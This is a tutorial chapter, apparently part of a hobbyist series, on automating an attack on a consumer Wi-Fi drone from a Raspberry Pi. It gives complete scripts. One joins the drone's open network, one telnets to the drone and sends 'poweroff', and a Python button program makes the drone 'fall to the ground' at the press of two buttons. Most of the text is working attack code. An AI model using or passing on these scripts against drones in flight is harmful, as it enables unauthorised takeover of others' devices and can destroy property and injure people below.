# Returning to the Pi

Now that we know how to exploit the vulnerabilities of the drone, lets see if we can make it all happen with the push of two buttons.

## Automating the attack

As we've seen from our previous experiment we can use telnet to access and shutdown the drone.
Since we're using a headless Pi (no monitor/keyboard/mouse), we should try to automate both connecting to the drone and issuing a telnet/kill command.

### Connecting to the drone

On the Pi navigate to the drone-hack folder and create a file called `join_ network.sh`.

``` Bash

pi@raspberrypi:~/drone-hack $ nano join_network.sh

```

Paste the following code into the file, but make sure you replace <DRONE_SSID> with the SSID you found in the previous step.

```Bash

#!/bin/bash
service network-manager stop
service networking stop
killall wpa_supplicant
killall dhclient
ifconfig wlan0 down
iwconfig wlan0 essid <DRONE_SSID>
ifconfig wlan0 up

```

Save the file and make sure it's executable by running `chmod`.

```Bash

pi@raspberrypi:~/drone-hack $ chmod 755 join_network.sh

```

### Powering off

Create a new file called `power_off.sh`, we'll use this script to telnet into the drone and to issue a `poweroff` command.

```Bash

#!/bin/bash
telnet 192.168.1.1 <<EOF
poweroff
EOF

```

Save it and make sure it's executable by running `chmod`.

```Bash

pi@raspberrypi:~/drone-hack $ chmod 755 power_off.sh

```

## Tying it all together

We'll now use the two buttons to trigger the `join_network.sh` and `power_off.sh` scripts - together with the `os`-package in Python.
This module provides a portable way of using operating system dependent functionality.

Create a new file and paste the update [code](#drone-hack-v01) into it.

```Bash

pi@raspberrypi:~/drone-hack $ nano step4.py

```

Save and run the program! We'll now turn the drone on again and try to issue the automated attack.
Hopefully we've done everything right, and will make the drone fall to the ground. 

(ツ)

```Bash

pi@raspberrypi:~/drone-hack $ python3 step4.py

```


#### drone-hack v0.1

```Python 
import RPi.GPIO as GPIO
import time
import os

GPIO.setmode(GPIO.BCM)
GPIO.setup(23, GPIO.IN, pull_up_down=GPIO.PUD_UP) #Button to GPIO23
GPIO.setup(24, GPIO.OUT)  #LED to GPIO24

GPIO.setup(25, GPIO.OUT)  #LED to GPIO25
GPIO.setup(26, GPIO.IN, pull_up_down=GPIO.PUD_UP) #Button to GPIO26


def Connect():
    try:
        while True:
             button1 = GPIO.input(23)
             button2 = GPIO.input(26)
             if button1 == False:
                 # We need root privileges to kill of some of the processes.
                 os.system('sudo sh /home/pi/drone-hack/join_network.sh')
                 # Wait for a connection before powering off..  
                 CheckConnection()
             elif button2 == False:
                 GPIO.output(25, True)
                 print('Powering off...')
                 os.system('sh /home/pi/drone-hack/power_off.sh')
             else:
                 GPIO.output(24, False)
                 GPIO.output(25, False)
    except:
        print('Error')
        GPIO.cleanup()

# crude way of checking that a connection has been established 
def CheckConnection():
     print('Checking connection...')
     while True:
        GPIO.output(24, True)
        ssid = os.popen("iwconfig wlan0 \
                | grep 'ESSID' \
                | awk '{print $4}' \
                | awk -F\\\" '{print $2}'").read()
        if ssid.startswith('ardrone') == True:
             time.sleep(3.0)
             GPIO.output(24, True)
             break
        else:
             GPIO.output(24, False)
             time.sleep(1.0)

     print("ssid: " + ssid)    
        
Connect()


```